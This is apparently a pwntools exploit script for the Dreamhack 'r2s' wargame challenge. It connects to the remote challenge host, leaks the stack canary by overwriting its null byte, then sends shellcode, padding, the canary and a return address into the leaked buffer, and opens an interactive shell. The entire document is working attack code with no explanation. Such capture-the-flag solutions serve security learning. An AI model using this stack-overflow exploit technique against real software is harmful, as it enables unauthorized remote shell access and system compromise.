from pwn import *

p = remote('host3.dreamhack.games', 16878)
e = ELF('./r2s')

context.arch = 'amd64'
shellcode = asm(shellcraft.sh())

p.recvuntil(b'buf: ')
buf_addr = int(p.recvline().strip(), 16)
p.recvuntil(b'$rbp: ')
buf2rbp = int(p.recvline().strip(), 10)
buf2canary = buf2rbp - 0x8

buf = b'A' * buf2canary + b'A'
p.sendafter(b'Input: ', buf)
p.recvuntil(buf)
canary = u64(b'\x00' + p.recvn(7))

payload = shellcode + b'A' * (buf2canary - len(shellcode))
payload += p64(canary)
payload += b'A' * 0x8
payload += p64(buf_addr)
p.sendafter(b'Input: ', payload)

p.interactive()